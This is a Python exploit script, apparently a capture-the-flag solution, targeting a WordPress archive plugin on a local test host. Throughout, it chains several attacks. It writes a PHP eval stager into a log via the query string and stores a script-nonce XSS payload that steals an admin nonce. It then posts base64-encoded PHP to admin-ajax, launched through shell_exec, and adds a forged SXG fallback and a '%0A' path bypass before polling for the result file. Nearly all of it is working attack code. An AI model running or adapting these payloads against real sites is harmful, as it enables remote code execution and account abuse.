#!/usr/bin/env python3
import argparse
import base64
import http.cookiejar
import re
import socket
import ssl
import struct
import subprocess
import time
import urllib.parse
import urllib.request


LEAK_TK = "kp"
R2_REF = "r2pwn"


def http_raw(host, port, tls, qs):
    req = (
        f"GET /?{qs} HTTP/1.1\r\n"
        f"Host: {host}{'' if port in (80, 443) else ':' + str(port)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), 5)
    if tls:
        ctx = ssl._create_unverified_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    s.sendall(req)
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    return data


class Client:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.ctx = ssl._create_unverified_context() if self.base.startswith("https://") else None
        parsed = urllib.parse.urlparse(self.base)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.tls = parsed.scheme == "https"
        handlers = [urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())]
        if self.ctx is not None:
            handlers.append(urllib.request.HTTPSHandler(context=self.ctx))
        self.opener = urllib.request.build_opener(*handlers)

    def open(self, req, timeout):
        return self.opener.open(req, timeout=timeout)

    def get(self, path, timeout=10):
        return self.open(urllib.request.Request(self.base + path), timeout)

    def post_form(self, path, fields, timeout=10):
        data = urllib.parse.urlencode(fields).encode()
        req = urllib.request.Request(self.base + path, data=data)
        return self.open(req, timeout)


def post_record(client, ref, title, body, source="s"):
    client.post_form("/", {
        "archive_submit": "1",
        "ref": ref,
        "title": title,
        "body": body,
        "source": source,
    }).read()


def post_record_raw_body(client, ref, body_bytes):
    fields = {
        "archive_submit": "1",
        "ref": ref,
        "title": "t",
        "source": "s",
    }
    boundary = "----frb"
    parts = []
    for key, value in fields.items():
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{key}\"\r\n\r\n{value}\r\n".encode()
        )
    parts.append(
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"body\"\r\n\r\n".encode()
        + body_bytes + b"\r\n"
    )
    parts.append(f"--{boundary}--\r\n".encode())
    payload = b"".join(parts)
    req = urllib.request.Request(
        client.base + "/",
        data=payload,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    client.open(req, 10).read()


def leak_csp_nonce(client):
    r = client.get("/?render=probe")
    csp = r.headers.get("Content-Security-Policy", "")
    m = re.search(r"nonce-([a-f0-9]+)", csp)
    if not m:
        raise RuntimeError("failed to leak CSP nonce")
    return m.group(1)


def build_sxg(fallback_url):
    def u16(n):
        return struct.pack(">H", n)

    def u24(n):
        return struct.pack(">I", n)[1:]

    fb = fallback_url.encode()
    return (
        b"sxg1-b3\x00" + u16(len(fb)) + fb + u24(20) + u24(18)
        + b"garbagesignaturedata" + b"garbagecborheaders" + b"PAYLOAD"
    )


def poll_seed_ref(client, timeout):
    end = time.time() + timeout
    while time.time() < end:
        try:
            body = client.get("/wp-content/uploads/.reports.queue", timeout=5).read().decode(errors="replace")
        except Exception:
            body = ""
        refs = [line.strip() for line in body.splitlines() if line.strip()]
        if refs:
            return refs[0]
        time.sleep(2)
    raise RuntimeError("seed ref not found in public queue")


def local_seed(seed_ref):
    helper = r'''
B=http://127.0.0.1:4000
SEAL=$(curl -s -b admin.cookies "$B/wp-admin/admin.php?page=archive-desk" | sed -n 's/.*id="seal" value="\([^"]*\)".*/\1/p' | head -1)
curl -s -b admin.cookies "$B/wp-admin/admin-ajax.php" --data "action=archive_seal_record&_wpnonce=$SEAL&ref=%s" >/dev/null
'''
    subprocess.run(["bash", "-c", helper % seed_ref], check=False)


def build_launcher_b64():
    keeper_src = open("keeper_payload.php", "rb").read()
    keeper_src = re.sub(br"^\s*<\?php\s*", b"", keeper_src, count=1)
    child_php = "eval(base64_decode(%r));" % base64.b64encode(keeper_src).decode()
    launcher = "shell_exec('/usr/bin/php -r ' . escapeshellarg(%r) . ' >/dev/null 2>&1');" % child_php
    return base64.b64encode(launcher.encode()).decode()


def clerk_login(client, user, password):
    client.get("/wp-login.php").read()
    client.post_form("/wp-login.php", {
        "log": user,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": client.base + "/wp-admin/",
        "testcookie": "1",
    }).read()


def self_seal(client, ref):
    path = "/wp-admin/index.php/%0A/wp-admin/toplevel_page_archive-desk"
    html = client.get(path).read().decode(errors="replace")
    m = re.search(r'id="seal" value="([^"]+)"', html)
    if not m:
        raise RuntimeError("failed to recover seal nonce")
    seal = m.group(1)
    client.post_form("/wp-admin/admin-ajax.php", {
        "action": "archive_seal_record",
        "_wpnonce": seal,
        "ref": ref,
    }).read()


def run():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:4000")
    ap.add_argument("--seed-ref", default=None)
    ap.add_argument("--queue-timeout", type=int, default=0)
    ap.add_argument("--local-seed", action="store_true")
    ap.add_argument("--self-seal", action="store_true")
    ap.add_argument("--clerk-user", default="archive_clerk")
    ap.add_argument("--clerk-pass", default="ArchiveClerk!2026")
    ap.add_argument("--result-path", default="/wp-content/uploads/kf_result.txt")
    args = ap.parse_args()

    client = Client(args.base)
    seed_ref = args.seed_ref
    if seed_ref is None and args.queue_timeout > 0:
        print("[*] polling public queue for seeded ref")
        seed_ref = poll_seed_ref(client, args.queue_timeout)
        print("    seed ref =", seed_ref)
    if seed_ref is None and args.self_seal:
        seed_ref = "selfseal_" + str(int(time.time()))
        print("    using self-sealed ref =", seed_ref)
    if seed_ref is None:
        raise RuntimeError("need --seed-ref or --queue-timeout")

    pop_b64 = open("pop_payload.b64").read().strip()
    keeper_b64 = build_launcher_b64()

    print("[*] stage 1: leak CSP nonce")
    nonce = leak_csp_nonce(client)
    print("    csp nonce =", nonce)

    print(f"[*] stage 2: pre-write PHP stager into uploads/leak_{LEAK_TK}.log")
    http_raw(client.host, client.port, client.tls, f"archive_leak=reset&tk={LEAK_TK}")
    http_raw(client.host, client.port, client.tls, f"archive_leak&tk={LEAK_TK}&<?=eval(base64_decode(end($_POST)))?>")

    print(f"[*] stage 3: store R2 payload as record '{R2_REF}'")
    js = (
        "var B=%r;var X=%r;" % (pop_b64, keeper_b64) +
        "fetch('/?archive_moderation&ref=zz').then(function(r){return r.text()}).then(function(t){"
        "var n=(t.match(/archive_nonce\\\" value=\\\"([^\\\"]+)\\\"/)||[])[1];"
        "var b='action=archive_process_record&_wpnonce='+n+'&blob='+encodeURIComponent(B)+'&x='+encodeURIComponent(X);"
        "fetch('/wp-admin/admin-ajax.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});"
        "});"
    )
    r2_body = f'<script nonce="{nonce}">{js}</script><h1>ok</h1>'
    post_record(client, R2_REF, "t", r2_body)

    print(f"[*] stage 4: overwrite seeded ref '{seed_ref}' with SXG fallback")
    sxg = build_sxg(f"https://127.0.0.1:1338/?render={R2_REF}")
    post_record_raw_body(client, seed_ref, sxg)

    if args.local_seed:
        print("[*] stage 5: locally queue seeded ref")
        local_seed(seed_ref)
    elif args.self_seal:
        print("[*] stage 5: clerk login + self-seal")
        clerk_login(client, args.clerk_user, args.clerk_pass)
        self_seal(client, seed_ref)

    print("[*] waiting for public result")
    flag_url = client.base + args.result_path
    for i in range(60):
        time.sleep(5)
        try:
            body = client.open(urllib.request.Request(flag_url), 5).read().decode(errors="replace")
            if body.strip():
                print("\n[+] RESULT:\n" + body)
                return
        except Exception:
            pass
        print(f"    [t={(i + 1) * 5}s] not yet")
    raise RuntimeError("timed out waiting for result")


if __name__ == "__main__":
    run()
